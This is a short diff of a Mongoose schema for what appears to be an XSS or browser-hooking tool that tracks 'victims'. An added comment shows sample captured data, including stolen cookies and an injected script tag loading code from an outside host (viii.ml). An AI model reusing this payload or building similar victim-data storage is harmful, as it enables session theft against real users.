@@ -26,11 +26,6 @@ var _Item = new Schema({
     *       ["test", {"str":"test"}]
     *   ]
     */
-    /*
-    *   modules:{
-    *       "auto_accept":{}
-    *   }
-    */
 });
 var _Victim = new Schema({
     owner:String,
@@ -40,6 +35,18 @@ var _Victim = new Schema({
     load:{},
     modules:{},
     status:{},
+    /*
+    *   status:{
+    *       "Server":{
+    *           "referer":["http://127.0.0.1/", "http://localhost/"],
+    *           "ip":["127.0.0.1"]
+    *       },
+    *       "Browser":{
+    *           "cookie":["who=yyyyy", "who=what"],
+    *           "the_page":["<script src=//viii.ml/?i=*>"]
+    *       }
+    *   }
+    */
     now:String
 });
 var _Page = new Schema({
